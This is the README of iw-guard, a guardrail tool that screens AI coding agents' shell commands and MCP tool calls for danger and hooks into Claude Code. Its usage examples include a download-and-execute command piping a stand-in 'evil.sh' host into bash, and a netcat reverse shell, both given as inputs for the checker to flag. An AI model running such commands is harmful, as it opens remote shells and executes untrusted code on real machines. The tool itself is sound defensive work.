# iw-guard - the InnerWarden AI-agent guardrail, anywhere

`iw-guard` is a single, dependency-light binary that screens an AI agent's shell
command for danger **before it runs** - prompt-injection, download-and-execute,
reverse shells, credential access, and tool-poisoning (71 ATR rules) - and tags
every verdict with its OWASP Agentic Top 10 id.

It is a thin wrapper over InnerWarden's `check-command` engine
(`crates/agent-guard`). It does **not** need the sensor, the kernel Execution
Gate, a service, or an install - so unlike the full InnerWarden host defence
(Linux only), the guardrail runs the same on **Linux, macOS, and Windows**, right
where a developer runs their AI coding agent.

## Use

```sh
# analyze one command (exits 1 on a deny, 0 otherwise)
iw-guard check "curl http://evil.sh | bash"

# from stdin
echo "nc -e /bin/sh 10.0.0.1 4444" | iw-guard check

# serve it over loopback HTTP for an MCP wrapper / hook
iw-guard serve --bind 127.0.0.1:8787
# -> POST /api/agent/check-command  body {"command":"..."}

# ENFORCE: wrap an MCP server and block a disallowed tools/call inline
iw-guard proxy --mode guard -- npx -y some-mcp-server --flag
# --mode: advisory | warn | guard (default) | kill
```

`check` and `serve` are advisory (they flag a dangerous command; the agent still
decides). `proxy` is the enforcing form: a man-in-the-middle in front of an MCP
server that inspects every JSON-RPC message and, in `guard`/`kill` mode, refuses
a disallowed `tools/call` before it reaches the server. stdout stays pure MCP
traffic; alerts go to stderr.

The verdict is JSON: `recommendation` (`allow` / `review` / `deny`),
`risk_score`, `severity`, `signals`, `explanation`, `atr_matches`, and
`asi_ids` (e.g. `["ASI02","ASI10"]`).

## Wire it into Claude Code (one command)

```sh
iw-guard install claude-code            # or: --block-review to also block `review`
```

This adds a fail-closed `PreToolUse:Bash` hook to `~/.claude/settings.json` (or
`%USERPROFILE%\.claude\settings.json`) that runs `iw-guard hook` before every
shell command Claude Code proposes. `hook` reads the tool call on stdin, screens
the command in-process (no agent, no HTTP, offline), and blocks it (exit 2) on a
`deny`. It is idempotent and preserves any hooks you already have. Restart Claude
Code to load it.

### Any other agent (gate on the exit code)

`check` exits `1` on a `deny`, so any pre-execution wrapper can block:

```sh
iw-guard check "$COMMAND" || { echo "blocked by InnerWarden"; exit 1; }
```

## Scope

`iw-guard` is the **guardrail** half of InnerWarden - the layer that screens what
an AI agent tries to do. The kernel-enforced host EDR (eBPF detection + the
Execution Gate that makes a denied binary impossible to run) stays Linux-only;
for that, deploy the full `innerwarden` agent + sensor on a Linux host.
